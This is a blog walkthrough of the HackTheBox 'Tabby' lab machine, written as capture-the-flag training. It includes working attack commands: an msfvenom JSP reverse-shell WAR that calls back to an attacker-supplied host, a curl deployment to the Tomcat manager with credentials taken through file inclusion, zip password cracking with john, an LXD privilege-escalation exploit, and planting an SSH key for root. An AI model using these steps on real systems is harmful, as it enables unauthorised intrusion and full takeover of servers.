---
layout: post
title: HackTheBox Tabby walkthrough
gh-repo: c00rni/c00rni.github.io
gh-badge: [star, fork, follow]
tags: [enumeration, hackthebox, linpeas, ssh, lxd, tomcat, lfi, john]
comments: true
---


This is a write up about 'Tabby' box from HackThebox. Tabby machine have the ip address 10.10.10.194 and is rated as easy by the community. I exploited a Local File Inclusion (LFI) vulnerability to get the admin web server credentials, used those credentials to upload a war file and get remote code execution. I found the password of a backup file, logged myself as user 'ash' with it and exploit a 'lxd' privilege escalation vulnerability to get full control of the machine.


![into_card.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/8ef266cc2812400c8683218347a1d3fc.png)



As always I started by port enumeration.


![full_scan.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/987987c4fcf945e7aa64b25d8536798e.png)




![detail_scan.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/1f617483764c4fbba3a9f9b7a24f0afd.png)




I browser to the main website (on port 80) and found a [LFI](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion).



![suspicious_url.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/d980c4ba589345328af65147252aa056.png)



![lfi.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/27fc66fd9f9447228f593b962893566b.png)

The seconde HTTP server (on port 8080) had a basic installation of tomcat 9. I did my homework and found tomcat versions 7 to 9 were vulnerable to remote code execution if I could upload a malicious WAR file into the server.

Tomcat9 allows users to upload WAR files into the server to  install web applications (see: [remote deploy documentation](http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Deploy_A_New_Application_Archive_(WAR)_Remotely)) but users must be authenticated and have manager rights define into `tomcat-users.xml` configuration file.
I used the LFI discovered previously to get access to `tomcat-users.xml` configuration file.

![tomcat-users.xml.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/e2780244817345728fc064069c33ee3a.png)

Tomcat is an open-source implementation of the Java servlet technology and can run jsp files. I used `msfvenom` to create a WAR file containing a malicious jsp document and upload the war file with curl.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=YOUR-IP-ADDR -f war -o reverseshell.war
curl -v -u 'tomcat':'$3cureP4s5w0rd123!' -T reverseshell.war http://10.10.10.194:8080/manager/text/deploy?path=/reverseshell4444&update=true
```

I used netcat to listen on port 4444 and browser to my newly upload application (http://10.10.10.194:8080/reverseshell4444) to get a shell.


![tomcat_shell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/e92487ac5644472cb38809675ee6b619.png)


I found a backup file protected by a password own by ash. 



![found_backup_file.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/c0fbaabf39734fd8aa4c5d8ae1039119.png)



Any user could read the file so I uploaded it  on my machine and brute force the password with john.

```bash
/usr/sbin/zip2john 16162020_backup.zip  > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

![backup_password.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/36d527c32c9c49d1882a6f9d650e8003.png)

I used the command `su ash` and log in with the password `admin@it`.

![ash_shell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/680afd5896ff4d52b1efe8d6e1cf2c93.png)

I enumerated the box for clues that could lead me to a privilege escalation with the automated tool [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) and found I could get to the user ash to root through a [lxd vulnerabilty](https://www.exploit-db.com/exploits/46978).

For the exploit to work properly I needed to upload a container image into the box since Tabby wasn't connected to the internet.

```bash
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
chmod +x build-alpine
./build-alpine
searchsploit -m linux/local/46978.sh
```

I downloaded '46978.sh' script and the container image from my machine into ash root directory and got a root shell on the container.

```
chmod +x 46978.sh
./46978.sh -f CONATAINER_IMAGE
```

![root_container.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/014af8c4a7fd4c54a6b4895471d07390.png)

The file system of Tabby is accessible from `/mnt/root/` and I can make any modification on the box since I'm root on the container. I created a pair of SSH key with `ssh-keygen` command and copy to content of the public key into `/mnt/root/.ssh/authorized_keys` file. 

I SSH into the box as root and got a shell.


![root_shell.png](https://raw.githubusercontent.com/c00rni/c00rni.github.io/master/_posts/_resources/5015ddcdcd06472190bc2e70b88565c9.png)

I like realistic box and this box is definitely one of them. I learned a lot about tomcat and lxd privilege root escalation.

# References
- [Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [lxd privilege escalation exploit](https://www.exploit-db.com/exploits/46978)
- [Automated Enumaration linux tool](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)
- [Tomcat 9 remote deploy documentation](http://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html#Deploy_A_New_Application_Archive_(WAR)_Remotely)
